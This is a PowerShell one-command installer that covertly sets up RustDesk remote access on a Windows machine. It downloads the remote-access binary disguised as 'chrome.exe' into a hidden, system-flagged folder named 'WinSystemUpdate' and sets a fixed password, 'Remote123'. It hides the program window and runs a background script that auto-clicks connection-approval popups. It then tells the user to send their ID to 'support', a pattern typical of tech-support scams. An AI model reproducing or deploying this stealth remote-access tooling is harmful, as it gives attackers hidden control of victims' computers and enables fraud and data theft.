# RustDesk Silent Installer - One Command Setup
# Usage: irm YOUR_RAW_URL | iex

# â”€â”€ CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
$SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"

$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"

# â”€â”€ 1. Kill old + clean â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Get-Process chrome -EA SilentlyContinue |
    Where-Object { $_.Path -like "*WinSystem*" } |
    Stop-Process -Force -EA SilentlyContinue
Start-Sleep 1
Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
New-Item -ItemType Directory $DEST -Force | Out-Null

# â”€â”€ 2. Download both files from GitHub (India CDN - fast!) â”€â”€â”€â”€â”€â”€â”€â”€
Write-Host "Installing..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'

$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
$SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"

# Use WebClient with parallel threads - fastest method
$wc1 = New-Object System.Net.WebClient
$wc2 = New-Object System.Net.WebClient

$t1 = $wc1.DownloadFileTaskAsync($CHROME_URL, "$DEST\chrome.exe")
$t2 = $wc2.DownloadFileTaskAsync($SCITER_URL, "$DEST\sciter.dll")

[System.Threading.Tasks.Task]::WaitAll($t1, $t2)

if (!(Test-Path "$DEST\chrome.exe") -or (Get-Item "$DEST\chrome.exe").Length -lt 1MB) {
    Write-Host "Download failed!" -ForegroundColor Red
    Read-Host "Press Enter to exit"; exit
}

# â”€â”€ 4. Write RustDesk config - permanent password â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$cfgDir = "$env:APPDATA\RustDesk\config"
New-Item -ItemType Directory $cfgDir -Force | Out-Null

# Main config - plain text password, RustDesk encrypts on first run
@"
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
"@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

# Options config - use permanent password only, no one-time password popup
@"
rendezvous_server = 'rs-ny.rustdesk.com:21116'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password'
"@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

# â”€â”€ 5. Hide the installation folder â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$f = Get-Item $DEST -Force
$f.Attributes = $f.Attributes -bor 2 -bor 4   # Hidden + System

# â”€â”€ 6. Launch RustDesk hidden as detached process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Set-Location $DEST
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "$DEST\chrome.exe"
$psi.WorkingDirectory = $DEST
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.UseShellExecute = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null
Start-Sleep 5

# â”€â”€ 7. Hide window â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
Get-Process chrome -EA SilentlyContinue |
    Where-Object { $_.Path -like "*WinSystem*" } |
    ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

# â”€â”€ 8. Get ID â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Start-Sleep 2
& "$DEST\chrome.exe" --get-id | Out-File "$DEST\id.txt" -Encoding ASCII
$RDID = (Get-Content "$DEST\id.txt" -Raw).Trim()

# â”€â”€ 9. Create desktop DELETE shortcut â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$deletePs = "$DEST\delete.ps1"
@"
`$d = '$DEST'
Get-Process chrome -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
`$desktopPaths = @([Environment]::GetFolderPath('Desktop'),"`$env:USERPROFILE\Desktop","`$env:USERPROFILE\OneDrive\Desktop")
foreach(`$dp in `$desktopPaths){ Remove-Item "`$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }
"@ | Set-Content $deletePs -Encoding ASCII

# Find desktop path (handles OneDrive Desktop too)
$lnkPath = $null
$desktopTry = @(
    [Environment]::GetFolderPath('Desktop'),
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive\Desktop"
)
foreach ($dp in $desktopTry) {
    if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
}
if ($lnkPath) {
    $s = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
    $s.TargetPath   = "powershell.exe"
    $s.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
    $s.IconLocation = "shell32.dll,131"
    $s.Save()
}

# â”€â”€ 10. Start accept.ps1 (auto-click accept popup) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$acceptPs = "$DEST\accept.ps1"
@'
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class RD {
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);
    [DllImport("user32.dll")] public static extern int  GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern int  GetWindowTextLength(IntPtr h);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int e);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr h);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left,Top,Right,Bottom; }
    public delegate bool EnumProc(IntPtr h, IntPtr l);
}
"@
$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
function Click-At($hwnd,$r){
    [RD]::ShowWindow($hwnd,9)|Out-Null
    [RD]::BringWindowToTop($hwnd)|Out-Null
    [RD]::SetForegroundWindow($hwnd)|Out-Null
    Start-Sleep -Milliseconds 400
    $cx=$r.Left+[int](($r.Right-$r.Left)*0.50)
    $cy=$r.Top+[int](($r.Bottom-$r.Top)*0.82)
    [RD]::SetCursorPos($cx,$cy)|Out-Null
    Start-Sleep -Milliseconds 150
    [RD]::mouse_event(2,0,0,0,0)
    Start-Sleep -Milliseconds 80
    [RD]::mouse_event(4,0,0,0,0)
    Start-Sleep -Milliseconds 500
    [RD]::ShowWindow($hwnd,0)|Out-Null
}
while($true){
    Start-Sleep -Milliseconds 300
    $pids=Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -eq "$DEST\chrome.exe"}|Select-Object -Expand Id
    if(!$pids){break}
    [RD]::EnumWindows({param($h,$l)
        $p=0;[RD]::GetWindowThreadProcessId($h,[ref]$p)|Out-Null
        if($p -notin $script:pids){return $true}
        $l=[RD]::GetWindowTextLength($h); if($l -eq 0){return $true}
        $sb=New-Object System.Text.StringBuilder($l+1)
        [RD]::GetWindowText($h,$sb,$l+1)|Out-Null
        $t=$sb.ToString()
        if($t -in "Chrome","chrome"){return $true}
        if($t -like "MSCTF*" -or $t -like "Default IME*"){return $true}
        $r=New-Object RD+RECT
        [RD]::GetWindowRect($h,[ref]$r)|Out-Null
        $w=$r.Right-$r.Left; $ht=$r.Bottom-$r.Top
        if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}
        return $true
    },[IntPtr]::Zero)|Out-Null
}
'@ | Set-Content $acceptPs -Encoding UTF8

Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden

# â”€â”€ 11. Start 1-hour auto-delete timer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$timerPs = "$DEST\timer.ps1"
@"
`$d = '$DEST'
Start-Sleep 3600
Get-Process chrome -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
Remove-Item ([Environment]::GetFolderPath('Desktop') + '\DELETE CHROME.lnk') -Force -EA SilentlyContinue
"@ | Set-Content $timerPs -Encoding ASCII

Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden

# â”€â”€ 12. Show result â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host ""
Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
Write-Host "   Password: Remote123" -ForegroundColor Cyan
Write-Host ""
Write-Host "   Send your ID to support." -ForegroundColor White
Write-Host "   Desktop shortcut: DELETE CHROME" -ForegroundColor Gray
Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor Green
Write-Host ""
